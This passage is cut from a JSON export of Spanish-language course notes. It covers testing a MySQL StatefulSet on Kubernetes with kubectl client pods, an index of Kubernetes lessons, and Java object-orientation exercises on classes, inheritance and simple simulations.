pods no se crean en paralelo, lo hacen de manera secuencial (algo fundamental en este caso, ya que hasta que no ha terminado el primer pod que contiene el contendor primario, no deben lanzarse los secundarios).\nPrueba de funcionamiento de la base de datos\n\nCreamos un pod ef√≠mero con un cliente de MySQL para crear una tabla con un registro en el pod mysql-0 (con nombre DNS mysql-0.mysql):\n\nkubectl run mysql-client --image=mysql:5.7 -i --rm --restart=Never --\\\n  mysql -h mysql-0.mysql &lt;&lt;EOF\nCREATE DATABASE prueba;\nCREATE TABLE prueba.saludos (mensaje VARCHAR(250));\nINSERT INTO prueba.saludos VALUES (&#039;Bienvenidos al curso del CEP de k8s&#039;);\nEOF\n\n\nUna vez realizada la modificaci√≥n en la base de datos, se eliminar√° el pod con el cliente MySQL. Creamos a continuaci√≥n otro pod que realizar√° una consulta a la base de datos, pero lo har√° a mysql-read con lo que comprobaremos que se ha realizado la sincronizaci√≥n a los secundarios:\n\nkubectl run mysql-client --image=mysql:5.7 -i -t --rm --restart=Never --\\\n  mysql -h mysql-read -e &quot;SELECT * FROM prueba.saludos&quot;\n\n\nPodemos comprobar los servidores que responden a una consulta a mysql-read solicitando el identificador del servidor en unas cuantas iteraciones, para lo que ejecutamos de forma interactiva una consulta repetidas veces para que se muestre el id del servidor que est√° respondiendo y as√≠ se vea el balanceo sobre todos los nodos:\n\nkubectl run mysql-client-loop --image=mysql:5.7 bash\n\n\nfor i in `seq 1 10`; do mysql -h mysql-read -e &#039;SELECT @@server_id,NOW()&#039;; sleep 1; done&quot;\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/index":{"title":"index","links":["DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.0-introduccion-a-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.1-implantacion-de-aplicaciones-web-en-contenedores","DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.2-docker","DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.3-orquestadores-de-contenedores","DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.4-el-proyecto-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.5-arquitectura-basica-de-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.0-instalacion-de-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.1-alternativas-para-instalacion-simple-de-k8s","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.2-introduccion-a-la-instalacion-de-minikube","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.4-instalacion-de-minikube-en-windows-+-virtualbox","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.5-instalacion-y-configuracion-de-kubectl-en-linux","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.6-instalacion-y-configuracion-de-kubectl-en-windows","DAW/Despliegue-de-aplicaciones-web/kubernetes/2.-instalacion-de-kubernetes/2.7-despliegues-de-aplicaciones-en-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.0-contenedores-en-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.1-describiendo-un-pod","DAW/Despliegue-de-aplicaciones-web/kubernetes/3.-contenedores-en-kubernetes-pods/3.2-gestionando-los-pods","DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.0-tolerancia-y-escalabilidad","DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.1-describiendo-un-replicaset","DAW/Despliegue-de-aplicaciones-web/kubernetes/4.-tolerancia-y-escalabilidad-replicasets/4.2-gestionando-los-replicaset","DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.0-deployments","DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.1-describiendo-un-deployment","DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.2-gestion-basica-de-un-deployment","DAW/Despliegue-de-aplicaciones-web/kubernetes/5.-despliegues-deployments/5.3-actualizacion-y-desactualizacion-de-un-deployment","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.0-acceso-a-las-aplicaciones","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.1-describiendo-services","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.2-gestionando-los-services","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.3-servicio-dns-en-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.4-ingress-controller","DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.5-ejemplo-completo-aplicacion-de-temperaturas","DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.0-despliegue-parametrizados","DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.1-variables-de-entorno","DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.2-configmaps","DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.3-secrets","DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.0-almacenamiento-en-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.1-volumenes-en-kubernetes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.2-aprovisionamiento-de-volumenes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.3-solicitud-de-volumenes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.4-uso-de-volumenes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-1-gestion-estatica-de-volumenes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-2-gestion-dinamica-de-volumenes","DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-3-wordpress-con-almacenamiento-persistente","DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.0-otras-cargas-de-trabajo","DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.1-statefulsets","DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.2-daemonsets","DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.3-jobs-y-cronjobs","DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/ejemplo-despliegue-de-un-cluster-con-mysql","DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm","DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.1-instalacion-de-helm","DAW/Despliegue-de-aplicaciones-web/kubernetes/10.-instalacion-de-aplicaciones-en-kubernetes-con-helm/10.2-gestion-de-charts-y-despliegue-de-aplicaciones"],"tags":[],"content":"Kubernetes\nApuntes sobre Kubernetes\n\n1.0-introduccion-a-kubernetes\n\n1.1-implantacion-de-aplicaciones-web-en-contenedores\n1.2-docker\n1.3-orquestadores-de-contenedores\n1.4-el-proyecto-kubernetes\n1.5-arquitectura-basica-de-kubernetes\n\n\n2.0-instalacion-de-kubernetes\n\n2.1-alternativas-para-instalacion-simple-de-k8s\n2.2-introduccion-a-la-instalacion-de-minikube\n2.3-instalacion-de-minikube-en-linux-con-kvm-virtualbox\n2.4-instalacion-de-minikube-en-windows-+-virtualbox\n2.5-instalacion-y-configuracion-de-kubectl-en-linux\n2.6-instalacion-y-configuracion-de-kubectl-en-windows\n2.7-despliegues-de-aplicaciones-en-kubernetes\n\n\n3.0-contenedores-en-kubernetes\n\n3.1-describiendo-un-pod\n3.2-gestionando-los-pods\n\n\n4.0-tolerancia-y-escalabilidad\n\n4.1-describiendo-un-replicaset\n4.2-gestionando-los-replicaset\n\n\n5.0-deployments\n\n5.1-describiendo-un-deployment\n5.2-gestion-basica-de-un-deployment\n5.3-actualizacion-y-desactualizacion-de-un-deployment\n\n\n6.0-acceso-a-las-aplicaciones\n\n6.1-describiendo-services\n6.2-gestionando-los-services\n6.3-servicio-dns-en-kubernetes\n6.4-ingress-controller\n6.5-ejemplo-completo-aplicacion-de-temperaturas\n\n\n7.0-despliegue-parametrizados\n\n7.1-variables-de-entorno\n7.2-configmaps\n7.3-secrets\n7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb\n\n\n8.0-almacenamiento-en-kubernetes\n\n8.1-volumenes-en-kubernetes\n8.2-aprovisionamiento-de-volumenes\n8.3-solicitud-de-volumenes\n8.4-uso-de-volumenes\nejemplo-1-gestion-estatica-de-volumenes\nejemplo-2-gestion-dinamica-de-volumenes\nejemplo-3-wordpress-con-almacenamiento-persistente\n\n\n9.0-otras-cargas-de-trabajo\n\n9.1-statefulsets\n9.2-daemonsets\n9.3-jobs-y-cronjobs\nejemplo-despliegue-de-un-cluster-con-mysql\n\n\n10.0-instalacion-de-aplicaciones-en-kubernetes-con-helm\n\n10.1-instalacion-de-helm\n10.2-gestion-de-charts-y-despliegue-de-aplicaciones\n\n\n\nMateriales desarrollados por: Alberto Molina Coballes y Jos√© Domingo Mu√±oz Rodr√≠guez\nPropiedad de la Consejer√≠a de Educaci√≥n y Deporte de la Junta de Andaluc√≠a\nBajo licencia: Creative Commons CC BY-NC-SA"},"DAW/Despliegue-de-aplicaciones-web/ra-criterios-contenidos-practicas":{"title":"ra-criterios-contenidos-practicas","links":[],"tags":[],"content":"Intro a redes: tryhackme.com/r/room/whatisnetworking"},"DAW/Programaci√≥n/Ejercicios-Java/1--Introducci√≥n-a-la-Orientaci√≥n-a-Objetos":{"title":"1- Introducci√≥n a la Orientaci√≥n a Objetos","links":["DAW/Programaci√≥n/Ejercicios-Java/Soluciones/Soluciones-bolet√≠n-1"],"tags":[],"content":"Estos ejercicios han sido cogidos del repositorio p√∫blico de Github: github.com/OpenWebinarsNet/java-desde-cero-orientacion-objetos\nEjercicio 1.\nSe necesita crear una clase que representar√° a un Alumno de un centro educativo. De cada alumno se quiere conocer el nombre, apellidos, email, edad y tel√©fono.\nSe necesitan diferentes constructores.\n\nSin argumentos.\nNombre, apellidos y edad.\nTodos los atributos.\n\nAdem√°s:\n\nSe deben implementar los m√©todos getters/setters.\nSe deben implementar los m√©todos equals, hashcode y toString.\nSe debe a√±adir un m√©todo que nos indique si el alumno es mayor de edad (&gt;= 18 a√±os).\n\nImplementa un m√©todo main donde se creen un par de objetos de tipo Alumno y se muestren por consola.\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 1\nEjercicio 2\nUtilizando la clase Alumno del ejercicio 1, crea un programa en Java que tenga un array de objetos de esta clase y nos indique cu√°l es el alumno m√°s joven de todos.\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 2\nEjercicio 3.\nSe necesita implementar una clase llamada Producto que tenga los siguientes atributos: c√≥digo, nombre, descripcion y precio. Se necesita un constructor sin argumentos y otro para todos los argumentos. Se deben implementar tambi√©n los m√©todos getters/setters, equals, hashCode y toString. Se necesita adem√°s un m√©todo que devuelva una cadena de caracteres seg√∫n el precio del producto, siguiendo las siguientes reglas:\n\nprecio &lt; 1.0‚Ç¨ ‚Üí GANGA\n1.0‚Ç¨ ‚áê precio &lt; 10 ‚Üí NORMAL\nprecio &gt;= 10 ‚Üí LUJO\n\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 3\nEjercicio 4\nPara implementar un juego, necesitamos una clase Personaje, que tendr√° los siguientes atributos: nombre, puntos de vida (un entero entre 0 y 100), puntos conseguidos (un valor entero mayor que 0) y una mochila, que ser√° un array de String con los nombres de algunos elementos que se puede encontrar por el juego (pociones, herramientas, ‚Ä¶). Este array puede tener, como mucho, 10 elementos. Para manejar el array, tambi√©n ser√≠a bueno tener una variable entera que nos indicara el n√∫mero de pociones o herramientas que tenemos dentro del array.\nImplementa un constructor sin argumentos, y otro que reciba como argumento el nombre. Ten en cuenta que cuando se instancia un Personaje siempre tendr√° 100 puntos de vida disponibles, as√≠ como 0 puntos conseguidos.\nIncluye los m√©todos equals, hashCode y toString. Tambi√©n los m√©todos getters, setters, salvo para los atributos de la mochila y su n√∫mero de elementos, que solamente tendr√°n m√©todo getter.\nA√±ade adem√°s los siguientes m√©todos:\n\nUno que sirva para agregar una poci√≥n o herramienta al array. Si el array est√° completo, simplemente no la a√±adir√°, pero mostrar√° un mensaje por consola, del tipo: ‚ÄúYA NO PUEDES CONSEGUIR M√ÅS ELEMENTOS PUES TU MOCHILA EST√Å COMPLETA‚Äù. Si todo va bien, devolver√° el n√∫mero de elementos que hay en la mochila.\nOtro m√©todo, que se llamar√° recibirGolpe que recibe un valor entero como argumento, con el n√∫mero de puntos de vida que se deben restar al personaje. Debe devolver el n√∫mero de puntos de vida que restan al personaje. Ten en cuenta que el valor resultante nunca debe ser menor que 0.\nOtro que sirva para buscar en el array la poci√≥n de tipo ‚ÄúBOTIQUIN‚Äù y usarla, y as√≠ incrementar en 10 unidades los puntos de vida. Ten en cuenta que los puntos de vida no pueden superar nunca el n√∫mero 100.\nDebe devolver el n√∫mero de puntos de vida resultante. Si no tiene ninguna poci√≥n de tipo ‚ÄúBOTIQUIN‚Äù, debe mostrar un mensaje como este por consola: ‚ÄúLO SIENTO, PERO NO TIENES NINGUNA POCI√ìN DE BOTIQU√çN‚Äù.\n\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 4\nEjercicio 5.\nModifica el ejercicio 2 para incluir en el alumno un atributo que incluya todas las notas del alumno en un array de float (float[]). A√±ade adem√°s un m√©todo, llamado notaMedia() que sea capaz de devolver como un valor num√©rico la nota media del alumno.\nEjercicio 6\nCompleta el ejercicio anterior de modo que tenga un nuevo m√©todo, llamado notaMediaLiteral(), que siga las siguientes reglas.\nSi la nota media es alguno de los siguientes valores, debe devolver el literal correspondiente:\n\n0..4 Insuficiente\n5 Suficiente\n6 Bien\n7,8 Notable\n9,10 Sobresaliente.\n\nEjercicio 7.\nCompleta los ejercicios anteriores para implementar un programa que sea capaz de mostrar los dos alumnos con la mayor nota media.\nEjercicio 8\nModifica la clase Producto del ejercicio 3 para a√±adir:\n\nUn atributo llamado descuento, de tipo double, que indique el porcentaje de descuento del producto (valor entre 0 y 1; por ejemplo, 30% se almacena como 0.3).\nUn m√©todo, llamado precioFinal, que devuelva el precio aplicando el descuento, si es que lo tiene.\n"},"DAW/Programaci√≥n/Ejercicios-Java/2--Dise√±o-de-clases":{"title":"2- Dise√±o de clases","links":["DAW/Programaci√≥n/Ejercicios-Java/Soluciones/Soluciones-bolet√≠n-2"],"tags":[],"content":"Estos ejercicios han sido cogidos del repositorio p√∫blico de Github: github.com/OpenWebinarsNet/java-desde-cero-orientacion-objetos\nEjercicio 1\nCrea una aplicaci√≥n de c√°lculos estad√≠sticos en Java con 2 clases:\n\nMuestra: representar√° una muestra de n√∫meros enteros.\n\nComo atributos tendr√° el array de n√∫meros enteros y una variable que indica cu√°ntos valores hay realmente en el array (podemos tener un array de 10 posiciones, pero solamente haber introducido 3 datos).\nCrea varios constructores:\n\nUno sin argumentos. Debe instanciar el array con 10 posiciones. El n¬∫ de posiciones por defecto debe estar almacenado en una constante llamada DEFAULT_SIZE.\nOtro con un argumento entero, que ser√° el tama√±o del array.\nOtro que reciba un array, del cual se har√° una copia.\n\n\nLa clase tendr√° adem√°s un m√©todo para agregar n√∫meros a la muestra, y dos m√©todos getter, para obtener los n√∫meros y la cantidad de ellos.\n\n\nEstadistica: permitir√° realizar c√°lculos estad√≠sticos sobre una instancia de Muestra. Los c√°lculos a realizar ser√°n:\n\nMedia: el valor promedio de todos.\nModa: el valor que m√°s se repite.\n\nTodos los m√©todos de esta clase se podr√°n utilizar sin crear una instancia de la misma\n\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 1\nEjercicio 2\nRealizar algunas mejoras sobre el ejercicio 1:\n\nMejorar el m√©todo Muestra.agregarNumero(...) de tal forma  que si al agregar un n√∫mero vamos a superar el tama√±o del array, aumente la capacidad de este en 10 unidades. Esta operaci√≥n de recolocaci√≥n se realizar√° mediante un m√©todo privado.\nMejorar el m√©todo Estadistica.media de tal forma que lo vamos a sobrecargar para que haya otra versi√≥n que acepte √∫nicamente un array de enteros, y calcule el promedio de todos ellos. Para aprovechar el c√≥digo, se debe crear un tercer m√©todo, privado, que haga realmente el c√°lculo de la media, y usarlo en los dos m√©todos p√∫blicos.\n\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 2\nEjercicio 3\nCrea una clase Cartera, que servir√° para manejar el dinero que se lleva encima. Esta se podr√° crear a trav√©s un constructor vac√≠o o de un constructor con un argumento, que ser√° el dinero inicial de la cartera. Como atributo, tendr√° el saldo de dinero disponible. Se deben a√±adir los siguientes m√©todos:\n\nsacarDinero(double cantidad): debe seguir las siguientes reglas\n\nSi hay disponible, sacar√° todo el dinero que se ha solicitado.\nSi no hay saldo suficiente disponible, solamente sacar√° el dinero disponible, e imprimir√° un mensaje por consola diciendo: TU SALDO SE HA QUEDADO A 0.\nSi el saldo al inicio de la operaci√≥n es 0, debe mostrar el mensaje NO TIENES SALDO DISPONIBLE.\n\n\nconsultarSaldo(): debe devolver un double con el saldo disponible.\nmeterDinero(double cantidad): agregar√° una cuant√≠a al saldo de la cartera.\n\nCrea adem√°s un m√©todo main que muestre el funcionamiento de esta clase.\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 3\nEjercicio 4\nSe necesita crear una clase Password para manejar contrase√±as. Esta clase debe incluir:\n- Un m√©todo p√∫blico y est√°tico que sea capaz de generar una contrase√±a aleatoria. Recibir√° como argumento el n√∫mero de caracteres de la contrase√±a aleatoria a generar.\n- Las instancias de la clase incluir√°n:\n  - Un atributo de tipo cadena de caracteres con la contrase√±a.\n  - Un constructor vac√≠o y otro con un argumento de tipo String.\n  - Los m√©todos getter/setter para la contrase√±a.\n  - Un m√©todo que devolver√° la longitud de la contrase√±a.\n  - Un m√©todo, llamado `isStrong`, que devolver√° un booleano determinando si la contrase√±a es fuerte. Para ello, se seguir√°n las reglas del ejercicio 2 del bloque 5 del curso Java desde cero: Introducci√≥n, cuyo c√≥digo fuente est√° accesible [aqu√≠](github.com/lmlopezmagana/java-desde-cero-introduccion/blob/main/ejemplos/5.05_Ejercicio2/src/cadenas/Ejercicio02.java).\n\nImplementa tambi√©n una clase llamada Ejercicio04 que ilustre el funcionamiento de Password.\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 4\nEjercicio 5\nEscribir una clase Reloj que simule el comportamiento de un cron√≥metro digital:\n\nComo argumentos tendr√° 3 valores enteros: hora, minutos y segundos.\nDebe incluir un constructor sin par√°metros que dejar√° la hora a 00:00:00.\nUn m√©todo que devolver√° la hora actual.\nUn m√©todo para incrementar la hora actual en 1 segundo. Se debe manejar correctamente que cuando los segundos lleguen a 60, pasen a ser 00 y se incremente un minuto, y as√≠ con los minutos y las horas. Cuando se tenga las 23:59:59, el siguiente incremento deber√≠a devolver 00:00:00.\nUn m√©todo que realizar√° al puesta a 0 del cron√≥metro.\n\nEjercicio 6\nEscribir una clase Fecha que simule el comportamiento de una fecha del calendario.\n\nTendr√° tres argumentos: d√≠a, mes y a√±o.\nDebe incluir un constructor sin argumentos y otro con los 3 argumentos.\nEn todo momento, las fechas deben ser v√°lidas, y si los datos proporcionados no producen una fecha v√°lida, se obtendr√° como fecha el 01/01/2000.\nUn m√©todo que devolver√° la fecha en formato dia/mes/a√±o. Por ejemplo 18/09/2003.\nUn m√©todo incrementar que aceptar√° un n√∫mero de d√≠as, y que incrementar√° la fecha en dicha cantidad. El estado de la fecha debe ser consistente.\n\n\nRecuerda que un a√±o es bisiesto si es m√∫ltiplo de cuatro, no lo es de cien, o si lo es de 400.\n\n\nRecuerda que Enero, Marzo, Mayo, Julio, Agosto, Octubre y Diciembre tienen 31 d√≠as, y el resto de meses 30, salvo Febrero que tiene 28 (y en los a√±os bisiestos 29).\n\nEjercicio 7\nModificar la clase Estadistica del ejercicio 2 para a√±adir un una nueva sobrecarga del m√©todo media que acepte un varargs de n√∫meros enteros. Utiliza la implementaci√≥n del m√©todo privado media(array, int) para realizar el c√°lculo.\nEjercicio 8\nModifica la clase Estadistica para a√±adir las mismas sobrecargas del m√©todo media para el m√©todo moda.\nEjercicio 9\nUtilizando la clase Producto del ejercicio 3 de la secci√≥n 1, crea una clase para simular un carrito de la compra:\n\nTendr√° un array para poder agregar los productos que deseemos.\nA√±ade los constructores que estimes necesarios.\nDeber√° tener un m√©todo que nos indique la cantidad de productos en el carrito.\nTendr√° un m√©todo que nos devuelva el precio total de los productos del carrito.\nTendr√° un m√©todo para a√±adir productos al carrito, y otro para sacar productos del carrito. Es posible que sea bueno que tengas alg√∫n m√©todo privado para reajustar el tama√±o del array.\n\nEjercicio 10\nUtilizando como base la clase Personaje del ejercicio 4 de la secci√≥n 1, con las siguientes consignas:\n\n\nModifica la clase Personaje para que incluya un atributo, puntosFuerza, que ser√° un entero entre 1 y 10.\n\n\nCrea una clase que simule una Batalla entre personajes. Para ello:\n\nTendr√° un m√©todo est√°tico que recibir√° dos personajes, que luchar√°n en la batalla.\nDebe devolver el personaje que ha ganado, o null si finalmente no ha ganado ninguno.\nPara la batalla, los  Personajes se dar√°n diferentes golpes, siguiendo estas reglas:\n\nSe dar√°n golpes hasta que uno (o los dos) se queden sin puntos de vida.\nEl golpe tendr√° como puntuaci√≥n un n√∫mero aleatorio entre 1 y 3, multiplicado por los puntos de fuerza del Personaje.\nSi uno de los Personajes, durante la batalla, llega a menos de 30 puntos de vida, puede tomar alguna de sus pociones de BOTIQUIN.\nPuedes inventarte algunas pociones m√°s que pueda usar el personaje para incrementar la fuerza de los golpes.\n\n\nTodas las iteraciones del bucle del m√©todo de la batalla deber√≠an mostrar los pasos que suceden en la misma por la consola.\n\n\n\nCrea una clase, llamada Ejercicio10, donde se instancien los personajes y se realice la batalla."},"DAW/Programaci√≥n/Ejercicios-Java/3--Asociaciones-y-herencia":{"title":"3- Asociaciones y herencia","links":["DAW/Programaci√≥n/Ejercicios-Java/Soluciones/Soluciones-bolet√≠n-3"],"tags":[],"content":"Estos ejercicios han sido cogidos del repositorio p√∫blico de Github: github.com/OpenWebinarsNet/java-desde-cero-orientacion-objetos\nEjercicio 1\nNos han solicitado una aplicaci√≥n para gestionar algunos datos de una inmobiliaria.\n\nEsta tiene una serie de inmuebles. De cada uno de ellos queremos saber: identificador inmobiliario (entero), direcci√≥n, precio de venta y los metros cuadrados. Esta clase ser√° abstracta.\nLos inmuebles pueden ser de tipo Local u orientados a ser una vivienda.\nDe cada Local queremos saber si tiene salida de humos o no la tiene (booleano).\nDe cada inmueble orientado a ser una vivienda queremos saber el n√∫mero de habitaciones y el n√∫mero de ba√±os, adem√°s de las habitaciones que tiene. Esta clase ser√° abstracta.\nDe cada Habitaci√≥n queremos saber los metros cuadrados, el n√∫mero de ventanas y el uso que se le va a dar (dormitorio, sal√≥n, despacho, vestidor, ‚Ä¶)\nLos InmueblesVivienda pueden ser de dos tipos: Casa y Apartamento. De las casas queremos saber cu√°ntos pisos (plantas en altura) tiene.\nDe cada clase se necesita: constructores, getters/setters, equals, hashCode y toString.\nEl modelo de herencia no debe ser extensible ‚Üí clases selladas.\n\nImplementar adem√°s un main con algunas viviendas de ejemplo.\n\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 1\nEjercicio 2\nPartimos de la soluci√≥n al ejercicio anterior. El gobierno aplica algunos impuestos al precio de venta de los inmuebles.\n\nEn el caso de los Locales, el precio de venta se ve incrementado con un determinado porcentaje de plusval√≠a. El porcentaje depende de la localidad y se debe recibir en el constructor.\nPara los InmuebleVivienda, el impuesto que se paga es el IVA del 21%.\n\nImplementa un m√©todo que nos indique el precio final de venta aplicando los impuestos.\nA√±ade adem√°s un m√©todo est√°tico a la clase Main que reciba un Inmueble y muestre su informaci√≥n. Su comportamiento ser√° diferente en funci√≥n del tipo de inmueble. Para todos se mostrar√° el precio final, y adem√°s:\n\nPara los locales, se mostrar√° nada m√°s su direcci√≥n, los m2 y si tiene salida de humos.\nPara las casas, se mostrar√° su direcci√≥n, los m2, el n¬∫ de habitaciones y el n¬∫ de plantas o pisos.\nPara los apartamentos, se mostrar√° la direcci√≥n, los m2 y el n¬∫ de habitaciones.\n\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 2\nEjercicio 3\nUna tienda de m√≥viles nos pide ayuda para gestionar sus productos:\n\nTodo lo que venden, que podemos llamar Producto, tiene un nombre y un precio de venta.\nHay un tipo de producto que son los tel√©fonos m√≥viles, que tienen un tama√±o de pantalla, una cantidad de RAM y una cantidad de memoria de almacenamiento secundario.\nOtro tipo de productos son los Accesorios. De estos, tenemos a su vez, otros tipos como son las carcasas y los cargadores. Los accesorios tienen dentro un array de tel√©fonos m√≥viles, que indican aquellos con los que son compatibles.\n\nImplementa todas estas clases y un main de prueba.\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 3\nEjercicio 4\nModifica el ejercicio anterior para a√±adir un m√©todo que imprima la informaci√≥n de un Producto. Puede usar pattern matching para identificar el tipo de producto concreto.\nLa soluci√≥n del ejercicio est√° disponibles en: Soluciones ejercicio 4\nEjercicio 5\nMejora el ejercicio 4 para unificar el c√≥digo que muestra los tel√©fonos compatibles de un Accesorio. PISTA: Puedes usar un bloque if/else con instanceof, y en funci√≥n de eso, establecer el valor de la cadena de caracteres que se muestra.\nEjercicio 6\n\n\nImplementa una aplicaci√≥n para la gesti√≥n de los electrodom√©sticos de un bazar o tienda similar. Para ello, se necesitan las siguintes clases:\n\nElectrodomestico: de ellos queremos saber el tipo (congelador, lavadora, ‚Ä¶), la marca y modelo, la potencia y el precio. Debe incluir un m√©todo que devuelva el consumo el√©ctrico en funci√≥n del n√∫mero de horas que haya funcionado (argumento del m√©todo como n√∫mero decimal).\nCongelador: es un tipo de Electrodomestico que a√±ade como atributo turbo, que indica si est√° funcionando en este modo (booleano). Cuando un congelador est√° funcionando de este modo incrementa el consumo de forma que invierte un 25% m√°s de potencia. Por tanto, hay que sobrescribir el m√©todo que calcula el consumo para incluir este comportamiento.\nFrigor√≠fico: es otro tipo de Electrodomestico que a√±ade como atributo la temperatura a la cu√°l est√° funcionando. Es un n√∫mero entero de 2 a 8 grados cent√≠grados. El frigor√≠fico consume un 3% m√°s por cada grado adicional de diferencia sobre los 8¬∫. Es decir, que a 8¬∫ consume su potencia, a 7¬∫ un 3% m√°s, y as√≠ sucesivamente. Por tanto, tambi√©n hay que sobrescribir el m√©todo que calcula el consumo para incluir este comportamiento.\n\nImplementa todas estas clases, incluyendo todos los elementos necesarios (constructores, getters/setters, equals, hashCode, toString, ‚Ä¶). Implementa tambi√©n un main de ejemplo donde se creen varios electrodom√©sticos de diferentes tipos y se calcule el consumo de ellos para un n√∫mero determinado de horas.\n\n\nEjercicio 7\nModifica el ejercicio anterior para a√±adir un m√©todo que nos permita obtener el coste del consumo del electrodom√©stico. Para simiplificar el c√°lculo, supondremos que todas las horas del d√≠a tienen el mismo coste. ¬øEn qu√© clase habr√≠a que implementar dicho m√©todo? ¬øEs necesario sobrescribirlo en alguna otra clase?\nEjercicio 8\nUna biblioteca tiene un nombre y un array de libros. Se requiere que la biblioteca tenga un constructor que reciba como par√°metros\nel nombre de la biblioteca e inicialice la colecci√≥n de libros. La biblioteca posee los siguientes m√©todos:\n\nA√±adir libro que permite agregar un libro a la colecci√≥n de libros de la biblioteca.\nListar libros que muestra en pantalla los datos de todos los libros de la biblioteca invocando el m√©todo imprimir de los libros.\n\nCada libro tiene los siguientes datos: t√≠tulo , autor (cadena de caracteres), a√±o de publicaci√≥n (n√∫mero entero), editorial (cadena de caracteres), referencia bibliogr√°fica (cadena de caracteres). El libro debe tener un constructor que inicialice sus atributos y un m√©todo imprimir que muestre los valores de sus atributos en pantalla. Se requiere implementar una clase Main de prueba que instancie una biblioteca denominada ‚ÄúBiblioteca Nacional‚Äù y a√±ada a la biblioteca los siguientes libros de la siguiente tabla:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nT√≠tuloAutorA√±oEditorialReferenciaLa piel del tamborArturo P√©rez-Reverte1995Alfaguara9788420472065El libro negro de las horasEva Garc√≠a Saenz de Urturi2022Planeta9788408269649El c√≥digo Da VinciDan Brown2003Random House0385504209\nEjercicio 9\nEn un chiringuito de playa se 